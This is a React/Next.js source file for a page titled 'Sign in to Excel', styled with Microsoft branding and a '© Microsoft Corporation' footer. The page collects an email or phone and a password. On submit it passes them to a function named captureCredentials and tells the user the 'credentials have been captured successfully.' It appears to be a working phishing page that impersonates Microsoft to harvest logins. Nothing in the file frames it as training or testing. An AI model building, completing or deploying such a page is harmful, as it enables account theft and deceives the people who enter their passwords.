'use client';
import { FormEvent, useState } from 'react';
import Image from 'next/image';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import { useToast } from '@/hooks/use-toast';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import { PlaceHolderImages } from '@/lib/placeholder-images';

export default function Home() {
  const bgImage = PlaceHolderImages.find(
    (img) => img.id === 'login-background'
  );

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const { toast } = useToast();

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    await captureCredentials({ username, password });
    toast({
      title: 'Signed In',
      description: 'Your credentials have been captured successfully.',
    });
    // Reset form if needed
    setUsername('');
    setPassword('');
  };

  return (
    <div className="relative w-full h-full flex items-center justify-center">
      {bgImage && (
        <Image
          src={bgImage.imageUrl}
          alt={bgImage.description}
          layout="fill"
          objectFit="cover"
          className="filter blur-sm"
          data-ai-hint={bgImage.imageHint}
        />
      )}

      <Card className="w-[380px] max-w-[90vw] z-10 bg-white/90 text-black">
        <CardHeader className="text-center">
          <CardTitle className="text-[#217346] text-2xl font-bold">
            Sign in to Excel
          </CardTitle>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit}>
            <div className="space-y-4">
              <Input
                type="text"
                name="username"
                placeholder="Email or phone"
                autoComplete="username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                className="bg-white border-gray-300 focus:border-[#217346] focus:ring-[#217346]"
              />
              <Input
                type="password"
                name="password"
                placeholder="Password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                className="bg-white border-gray-300 focus:border-[#217346] focus:ring-[#217346]"
              />
              <Button
                type="submit"
                className="w-full bg-[#217346] hover:bg-[#1b5c39] text-white font-bold text-lg"
              >
                Sign in
              </Button>
            </div>
          </form>
        </CardContent>
        <CardFooter>
          <p className="text-xs text-gray-600 mx-auto">
            © Microsoft Corporation
          </p>
        </CardFooter>
      </Card>
    </div>
  );
}
